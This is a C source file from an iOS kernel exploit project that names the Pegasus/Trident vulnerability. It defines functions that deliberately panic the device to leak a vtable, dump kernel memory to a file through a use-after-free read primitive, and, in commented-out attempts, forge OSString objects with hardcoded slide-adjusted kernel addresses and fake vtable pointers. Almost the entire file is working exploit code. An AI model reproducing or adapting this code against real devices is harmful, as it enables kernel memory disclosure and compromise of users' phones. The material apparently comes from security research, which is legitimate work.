#include <errno.h>              // errno
#include <stddef.h>             // size_t
#include <stdio.h>              // FILE, fopen, fwrite, fclose
#include <string.h>             // strerror

#include "common.h"             // DEBUG
#include "io.h"                 // OSString, kOSStringNoCopy
#include "slide.h"              // get_kernel_slide
#include "try.h"                // THROW
#include "uaf_exec.h"           // uaf_parse
#include "uaf_read.h"           // uaf_get_bytes
#include "uaf_panic.h"          // uaf_panic_leak_vtab

#include "exploit.h"

void panic_leak()
{
    uaf_panic_leak_vtab();

    THROW("Failed to panic the device. Are you sure your iOS version is vulnerable to Pegasus/Trident?");
}

void dump()
{
    DEBUG("Dumping kernel to file");

    file_t kernel;
    uaf_dump_kernel(&kernel);
    FILE *f = fopen("kernel.bin", "wb");
    if(f == NULL)
    {
        free(kernel.buf);
        THROW("Failed to open output file (%s)", strerror(errno));
    }
    fwrite(kernel.buf, 1, kernel.len, f);
    fclose(f);
    free(kernel.buf);

    DEBUG("Wrote output to kernel.bin");
}

void exploit()
{
    file_t kernel;
    uaf_dump_kernel(&kernel);

    free(kernel.buf);
    /*size_t kslide = get_kernel_slide();
    OSString osstr =
    {
        .vtab = (void*)(0xffffff80044ef1f0 + kslide),   // TODO: hardcoded
        .retainCount = 100,                             // don't try to free this
        .flags = kOSStringNoCopy,                       // and neither the "string" it points to
        .length = 0x1000,                               // can't get more than 0x1000 at once
        .string = (void*)(0xffffff8004004000 + kslide), // kernel text base
    };
    char buf[0x1000];
    uaf_get_bytes(&osstr, buf, 0x1000);*/

    /*OSString osstr =
    {
        .vtab = (vtab_t)(0xffffff8004536370 + kslide) - 4,
        .retainCount = 100,
        .flags = kOSStringNoCopy,
        .length = 0x0,
        .string = NULL,
    };
    uaf_parse(&osstr);*/

    /*OSString osstr =
    {
        .vtable      = (void*)0x0,
        .retainCount =        0x0,
        .flags       =        0x0,
        .length      =        0x0,
        .string      = (void*)0x0,
    };
    uaf_parse(&osstr);*/
}
